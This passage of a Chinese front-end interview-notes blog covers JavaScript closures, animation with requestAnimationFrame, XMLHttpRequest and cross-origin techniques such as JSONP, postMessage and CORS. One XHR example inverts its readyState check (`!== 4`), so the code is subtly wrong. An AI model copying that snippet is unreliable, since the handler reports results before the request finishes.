class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Person</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">  <span class="keyword">var</span> name = <span class="string">"default"</span>;       </span><br><span class="line">  <span class="keyword">return</span> &#123;    </span><br><span class="line">    getName: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;    </span><br><span class="line">      <span class="keyword">return</span> name;    </span><br><span class="line">    &#125;,    </span><br><span class="line">    setName: <span class="function"><span class="keyword">function</span>(<span class="params">newName</span>) </span>&#123;    </span><br><span class="line">      name = newName;    </span><br><span class="line">    &#125;    </span><br><span class="line">  &#125;    </span><br><span class="line">&#125;;   </span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> Person();</span><br><span class="line">p.setName(<span class="string">"Tom"</span>);</span><br><span class="line">alert(p.getName()); <span class="comment">// Tom</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Jack = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;&#125;;</span><br><span class="line"><span class="comment">//继承自Person</span></span><br><span class="line">Jack.prototype = <span class="keyword">new</span> Person();</span><br><span class="line"><span class="comment">//添加私有方法</span></span><br><span class="line">Jack.prototype.Say = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  alert(<span class="string">"Hello,my name is Jack"</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> j = <span class="keyword">new</span> Jack();</span><br><span class="line">j.setName(<span class="string">"Jack"</span>);</span><br><span class="line">j.Say();</span><br><span class="line">alert(j.getName());</span><br></pre></td></tr></table></figure><p>我们定义了Person，它就像一个类，我们new一个Person对象，访问它的方法。<br>下面我们定义了Jack，继承Person，并添加自己的方法。</p></li></ul><h3 id="闭包优缺点"><a href="#闭包优缺点" class="headerlink" title="闭包优缺点"></a>闭包优缺点</h3><ol><li><p>优点</p><ul><li>缓存</li><li>面向对象中的对象</li><li>实现封装，防止变量跑到外层作用域中，发生命名冲突</li><li>匿名自执行函数，匿名自执行函数可以减小内存消耗</li></ul></li><li><p>缺点</p><ul><li><p>内存消耗<br>通常来说，函数的活动对象会随着执行期上下文一起销毁，但是，由于闭包引用另外一个函数的活动对象，因此这个活动对象无法被销毁，这意味着，闭包比一般的函数需要更多的内存消耗。</p></li><li><p>性能问题<br>使用闭包时，会涉及到跨作用域访问，每次访问都会导致性能损失。<br>因此在脚本中，最好小心使用闭包，它同时会涉及到内存和速度问题。不过我们可以通过把跨作用域变量存储在局部变量中，然后直接访问局部变量，来减轻对执行速度的影响。</p></li></ul></li></ol><hr><h2 id="实现一个持续的动画"><a href="#实现一个持续的动画" class="headerlink" title="实现一个持续的动画"></a>实现一个持续的动画</h2><h3 id="css-animation"><a href="#css-animation" class="headerlink" title="css animation"></a>css animation</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">keyframes</span> ani&#123;</span><br><span class="line">  <span class="selector-tag">from</span> &#123;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="selector-tag">to</span>&#123;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">200px</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-tag">div</span>&#123;</span><br><span class="line">  <span class="attribute">animation</span>: ani <span class="number">5s</span> linear infinite;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="js"><a href="#js" class="headerlink" title="js"></a>js</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 使用requestAnimationFrame</span></span><br></pre></td></tr></table></figure><hr><h2 id="requestAnimationFrame和setTimeout区别"><a href="#requestAnimationFrame和setTimeout区别" class="headerlink" title="requestAnimationFrame和setTimeout区别"></a>requestAnimationFrame和setTimeout区别</h2><p>图像在屏幕上更新的速度（频率），也即屏幕上的图像每秒钟出现的次数，它的单位是赫兹(Hz)。对于一般笔记本电脑，这个频率大概是60Hz。</p><p><code>setTimeout</code> 其实就是通过设置一个间隔时间来不断的改变图像的位置，从而达到动画效果的。但我们会发现，利用seTimeout实现的动画在某些低端机上会出现卡顿、抖动的现象。</p><p><code>setTimeout</code> 的执行步调和屏幕的刷新步调不一致，从而引起丢帧现象 <code>setTimeout</code> 的执行只是在内存中对图像属性进行改变，这个变化必须要等到屏幕下次刷新时才会被更新到屏幕上。如果两者的步调不一致，就可能会导致中间某一帧的操作被跨越过去，而直接更新下一帧的图像。假设屏幕每隔16.7ms刷新一次，而setTimeout每隔10ms设置图像向左移动1px。</p><p><code>requestAnimationFrame</code> 最大的优势是由系统来决定回调函数的执行时机。具体一点讲，如果屏幕刷新率是60Hz,那么回调函数就每16.7ms(1000/60)被执行一次，如果刷新率是75Hz，那么这个时间间隔就变成了1000/75=13.3ms，换句话说就是，<code>requestAnimationFrame</code> 的步伐跟着系统的刷新步伐走，这样就不会引起丢帧现象，也不会导致动画出现卡顿的问题。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> progress = <span class="number">0</span>;</span><br><span class="line"><span class="comment">//回调函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  progress += <span class="number">1</span>; <span class="comment">//修改图像的位置</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (progress &lt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="comment">//在动画没有结束前，递归渲染</span></span><br><span class="line">    <span class="built_in">window</span>.requestAnimationFrame(render);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//第一帧渲染</span></span><br><span class="line"><span class="built_in">window</span>.requestAnimationFrame(render);</span><br></pre></td></tr></table></figure><hr><h2 id="通信"><a href="#通信" class="headerlink" title="通信"></a>通信</h2><h3 id="同源策略"><a href="#同源策略" class="headerlink" title="同源策略"></a>同源策略</h3><ol><li>Cookie、LocalStorage、IndexDB无法读取</li><li>前端跨域的几种解决办法</li><li>AJAX 请求不能发送</li></ol><h3 id="前后端如何通信"><a href="#前后端如何通信" class="headerlink" title="前后端如何通信"></a>前后端如何通信</h3><ol><li>Ajax</li><li>Websocket</li><li>CORS</li></ol><h3 id="如何创建Ajax"><a href="#如何创建Ajax" class="headerlink" title="如何创建Ajax"></a>如何创建Ajax</h3><ol><li>XMLHttpRequest对象工作流程</li><li>兼容性处理</li><li>事件触发条件</li><li>事件触发顺序</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> xhr = <span class="built_in">window</span>.XMLHttpRequest ? <span class="keyword">new</span> XMLHttpRequest() : <span class="keyword">new</span> ActiveXObject(<span class="string">"Microsoft.XMLHTTP"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 请求成功回调函数</span></span><br><span class="line">xhr.onload = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'request success'</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 请求结束</span></span><br><span class="line">xhr.onloadend = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'request loadend'</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 请求出错</span></span><br><span class="line">xhr.onerror = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'request error'</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 请求超时</span></span><br><span class="line">xhr.ontimeout = <span class="function"><span class="params">e</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">'request timeout'</span>);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 请求回调函数</span></span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (xhr.readyState !== <span class="number">4</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.status === <span class="number">200</span>) &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'request success'</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="built_in">console</span>.log(<span class="string">'request error'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">xhr.timeout = <span class="number">0</span>; <span class="comment">// 设置超时时间,0表示永不超时</span></span><br><span class="line"><span class="comment">// 初始化请求</span></span><br><span class="line">xhr.open(<span class="string">'GET/POST/DELETE/...'</span>, <span class="string">'/url'</span>, <span class="literal">true</span> || <span class="literal">false</span>);</span><br><span class="line"><span class="comment">// 设置期望的返回数据类型 'json' 'text' 'document' ...</span></span><br><span class="line">xhr.responseType = <span class="string">''</span>;</span><br><span class="line"><span class="comment">// 设置请求头</span></span><br><span class="line">xhr.setRequestHeader(<span class="string">''</span>, <span class="string">''</span>);</span><br><span class="line"><span class="comment">// 发送请求</span></span><br><span class="line">xhr.send(<span class="literal">null</span> || <span class="keyword">new</span> FormData || <span class="string">'a=1&amp;b=2'</span> || <span class="string">'json字符串'</span>);</span><br></pre></td></tr></table></figure><hr><h2 id="前端跨域的几种解决办法"><a href="#前端跨域的几种解决办法" class="headerlink" title="前端跨域的几种解决办法"></a>前端跨域的几种解决办法</h2><blockquote><p>参考 <a href="https://segmentfault.com/a/1190000011145364" target="_blank" rel="noopener">segmentfault 前端常见跨域解决方案</a></p></blockquote><h3 id="什么是跨域？"><a href="#什么是跨域？" class="headerlink" title="什么是跨域？"></a>什么是跨域？</h3><p>跨域是指一个域下的文档或脚本试图去请求另一个域下的资源，这里跨域是广义的。<br>广义的跨域：</p><ol><li>资源跳转： A链接、重定向、表单提交</li><li>资源嵌入： <code>&lt;link&gt;</code>、<code>&lt;script&gt;</code>、<code>&lt;img&gt;</code>、<code>&lt;frame&gt;</code>等dom标签，还有样式中<code>background:url()</code>、<code>@font-face()</code>等文件外链</li><li>脚本请求： js发起的ajax请求、dom和js对象的跨域操作等</li></ol><p>其实我们通常所说的跨域是狭义的，是由浏览器同源策略限制的一类请求场景。</p><p><strong>什么是同源策略？</strong></p><p>同源策略/SOP（Same origin policy）是一种约定，由Netscape公司1995年引入浏览器，它是浏览器最核心也最基本的安全功能，如果缺少了同源策略，浏览器很容易受到XSS、CSFR等攻击。所谓同源是指”协议+域名+端口”三者相同，即便两个不同的域名指向同一个ip地址，也非同源。</p><p>同源策略限制以下几种行为：</p><ol><li>Cookie、LocalStorage 和 IndexDB 无法读取</li><li>DOM 和 JS对象无法获得</li><li>AJAX 请求不能发送</li></ol><h3 id="常见跨域场景"><a href="#常见跨域场景" class="headerlink" title="常见跨域场景"></a>常见跨域场景</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">URL                                      说明                是否允许通信</span><br><span class="line">http:<span class="comment">//www.domain.com/a.js</span></span><br><span class="line">http:<span class="comment">//www.domain.com/b.js         同一域名，不同文件或路径        允许</span></span><br><span class="line">http:<span class="comment">//www.domain.com/lab/c.js</span></span><br><span class="line"></span><br><span class="line">http:<span class="comment">//www.domain.com:8000/a.js</span></span><br><span class="line">http:<span class="comment">//www.domain.com/b.js         同一域名，不同端口             不允许</span></span><br><span class="line"> </span><br><span class="line">http:<span class="comment">//www.domain.com/a.js</span></span><br><span class="line">https:<span class="comment">//www.domain.com/b.js        同一域名，不同协议             不允许</span></span><br><span class="line"> </span><br><span class="line">http:<span class="comment">//www.domain.com/a.js</span></span><br><span class="line">http:<span class="comment">//192.168.4.12/b.js           域名和域名对应相同ip           不允许</span></span><br><span class="line"> </span><br><span class="line">http:<span class="comment">//www.domain.com/a.js</span></span><br><span class="line">http:<span class="comment">//x.domain.com/b.js           主域相同，子域不同             不允许</span></span><br><span class="line">http:<span class="comment">//domain.com/c.js</span></span><br><span class="line"> </span><br><span class="line">http:<span class="comment">//www.domain1.com/a.js</span></span><br><span class="line">http:<span class="comment">//www.domain2.com/b.js        不同域名                      不允许</span></span><br></pre></td></tr></table></figure><h3 id="面试时选答"><a href="#面试时选答" class="headerlink" title="面试时选答"></a>面试时选答</h3><p>jsonp、iframe、postMessage、CORS、websocket、nginx代理、nodejs代理</p><h3 id="跨域解决方案"><a href="#跨域解决方案" class="headerlink" title="跨域解决方案"></a>跨域解决方案</h3><p>1、 通过jsonp跨域<br>2、 postMessage跨域<br>3、 跨域资源共享（CORS）<br>4、 nginx代理跨域<br>5、 nodejs中间件代理跨域<br>6、 WebSocket协议跨域<br>7、 document.domain + iframe跨域<br>8、 location.hash + iframe<br>9、 window.name + iframe跨域</p><h4 id="通过jsonp跨域"><a href="#通过jsonp跨域" class="headerlink" title="通过jsonp跨域"></a>通过jsonp跨域</h4><p>jsonp缺点：只能实现get一种请求。</p><blockquote><p>具体内部逻辑参考：<a href="https://blog.csdn.net/hansexploration/article/details/80314948" target="_blank" rel="noopener">CSDN jsonp原理详解</a></p></blockquote><ol><li><p>原生js实现</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">script.type = <span class="string">'text/javascript'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传参并指定回调执行函数为onBack</span></span><br><span class="line">script.src = <span class="string">'http://www.domain2.com:8080/login?user=admin&amp;callback=onBack'</span>;</span><br><span class="line"><span class="built_in">document</span>.head.appendChild(script);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 回调执行函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">onBack</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">    alert(<span class="built_in">JSON</span>.stringify(res));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务端返回如下（返回时即执行全局函数）：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">onBack(&#123;<span class="string">"status"</span>: <span class="literal">true</span>, <span class="string">"user"</span>: <span class="string">"admin"</span>&#125;)</span><br></pre></td></tr></table></figure></li><li><p>jquery ajax</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    url: <span class="string">'http://www.domain2.com:8080/login'</span>,</span><br><span class="line">    type: <span class="string">'get'</span>,</span><br><span class="line">    dataType: <span class="string">'jsonp'</span>,  <span class="comment">// 请求方式为jsonp</span></span><br><span class="line">    jsonpCallback: <span class="string">"onBack"</span>,    <span class="comment">// 自定义回调函数名</span></span><br><span class="line">    data: &#123;&#125;,</span><br><span class="line">    success: <span class="function"><span class="keyword">function</span> (<span class="params">res</span>) </span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(res); </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>vue.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">this</span>.$http.jsonp(<span class="string">'http://www.domain2.com:8080/login'</span>, &#123;</span><br><span class="line">    params: &#123;&#125;,</span><br><span class="line">    jsonp: <span class="string">'onBack'</span></span><br><span class="line">&#125;).then(<span class="function">(<span class="params">res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(res); </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li><li><p>服务端处理<br>服务端的本质就是想办法再将reponse变成调用一个方法（将返回结果作为参数）<br>如何做呢？<br>服务端会创建一个如 <code>jsonp</code> 的 <code>html</code> 文件或 <code>js</code> 文件<br>调用 <code>jsonp</code> 请求的时候生成该文件，同时返回结果data塞到回调函数数。然后插入到head中，开始自执行。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 得到航班信息查询结果后的回调函数</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> flightHandler = <span class="function"><span class="keyword">function</span>(<span class="params">data</span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">'你查询的航班结果是：票价 '</span> + data.price + <span class="string">' 元，'</span> + <span class="string">'余票 '</span> + data.tickets + <span class="string">' 张。'</span>);</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 提供jsonp服务的url地址（不管是什么类型的地址，最终生成的返回值都是一段javascript代码）</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> url = <span class="string">"http://flightQuery.com/jsonp/flightResult.aspx?code=CA1998&amp;callback=flightHandler"</span>;</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 创建script标签，设置其属性</span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span></span><br><span class="line"><span class="javascript">    script.setAttribute(<span class="string">'src'</span>, url);</span></span><br><span class="line"><span class="javascript">    <span class="comment">// 把script标签加入head，此时调用开始</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">document</span>.getElementsByTagName(<span class="string">'head'</span>)[<span class="number">0</span>].appendChild(script); </span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>原理：script标签可跨院访问</p></li></ol><h4 id="postMessage跨域"><a href="#postMessage跨域" class="headerlink" title="postMessage跨域"></a>postMessage跨域</h4><p>postMessage是HTML5 XMLHttpRequest Level 2中的API，且是为数不多可以跨域操作的window属性之一，它可用于解决以下方面的问题：<br>a. 页面和其打开的新窗口的数据传递<br>b. 多窗口之间消息传递<br>c. 页面与嵌套的iframe消息传递<br>d. 上面三个场景的跨域数据传递</p><p><strong><em>用法</em></strong>：postMessage(data,origin)方法接受两个参数<br><strong>data</strong>：html5规范支持任意基本类型或可复制的对象，但部分浏览器只支持字符串，所以传参时最好用JSON.stringify()序列化。<br><strong>origin</strong>： 协议+主机+端口号，也可以设置为”*”，表示可以传递给任意窗口，如果要指定和当前窗口同源的话设置为”/“。</p><ol><li><p>a.html：(<a href="http://www.domain1.com/a.html" target="_blank" rel="noopener">http://www.domain1.com/a.html</a>)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"http://www.domain2.com/b.html"</span> <span class="attr">style</span>=<span class="string">"display:none;"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">       </span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">'iframe'</span>);</span></span><br><span class="line"><span class="javascript">    iframe.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> data = &#123;</span></span><br><span class="line"><span class="javascript">            name: <span class="string">'aym'</span></span></span><br><span class="line"><span class="undefined">        &#125;;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// 向domain2传送跨域数据</span></span></span><br><span class="line"><span class="javascript">        iframe.contentWindow.postMessage(<span class="built_in">JSON</span>.stringify(data), <span class="string">'http://www.domain2.com'</span>);</span></span><br><span class="line"><span class="undefined">    &#125;;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 接受domain2返回数据</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">'data from domain2 ---&gt; '</span> + e.data);</span></span><br><span class="line"><span class="javascript">    &#125;, <span class="literal">false</span>);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>b.html：(<a href="http://www.domain2.com/b.html" target="_blank" rel="noopener">http://www.domain2.com/b.html</a>)</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="comment">// 接收domain1的数据</span></span></span><br><span class="line"><span class="javascript">    <span class="built_in">window</span>.addEventListener(<span class="string">'message'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">        alert(<span class="string">'data from domain1 ---&gt; '</span> + e.data);</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="keyword">var</span> data = <span class="built_in">JSON</span>.parse(e.data);</span></span><br><span class="line"><span class="javascript">        <span class="keyword">if</span> (data) &#123;</span></span><br><span class="line"><span class="undefined">            data.number = 16;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="javascript">            <span class="comment">// 处理后再发回domain1</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">window</span>.parent.postMessage(<span class="built_in">JSON</span>.stringify(data), <span class="string">'http://www.domain1.com'</span>);</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="javascript">    &#125;, <span class="literal">false</span>); <span class="comment">// false默认为冒泡，true表示捕获</span></span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></li></ol><h4 id="跨域资源共享（CORS）"><a href="#跨域资源共享（CORS）" class="headerlink" title="跨域资源共享（CORS）"></a>跨域资源共享（CORS）</h4><blockquote><p><a href="http://www.ruanyifeng.com/blog/2016/04/cors.html" target="_blank" rel="noopener">阮一峰 cors</a></p></blockquote><p>普通跨域请求：只服务端设置 <code>Access-Control-Allow-Origin</code> 即可，前端无须设置，若要带cookie请求：前后端都需要设置。<br>目前，所有浏览器都支持该功能(IE8+：IE8/9需要使用 <code>XDomainRequest</code> 对象来支持CORS）)，CORS也已经成为主流的跨域解决方案。</p><ol><li><p>前端设置<br>1.）原生ajax</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 前端设置是否带cookie</span></span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br></pre></td></tr></table></figure><p> 示例代码：</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest(); <span class="comment">// IE8/9需用window.XDomainRequest兼容</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 前端设置是否带cookie</span></span><br><span class="line">xhr.withCredentials = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">xhr.open(<span class="string">'post'</span>, <span class="string">'http://www.domain2.com:8080/login'</span>, <span class="literal">true</span>);</span><br><span class="line">xhr.setRequestHeader(<span class="string">'Content-Type'</span>, <span class="string">'application/x-www-form-urlencoded'</span>);</span><br><span class="line">xhr.send(<span class="string">'user=admin'</span>);</span><br><span class="line"></span><br><span class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (xhr.readyState == <span class="number">4</span> &amp;&amp; xhr.status == <span class="number">200</span>) &#123;</span><br><span class="line">        alert(xhr.responseText);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>2.）jQuery ajax</p> <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    ...</span><br><span class="line">   xhrFields: &#123;</span><br><span class="line">       withCredentials: <span class="literal">true</span>    <span class="comment">// 前端设置是否带cookie</span></span><br><span class="line">   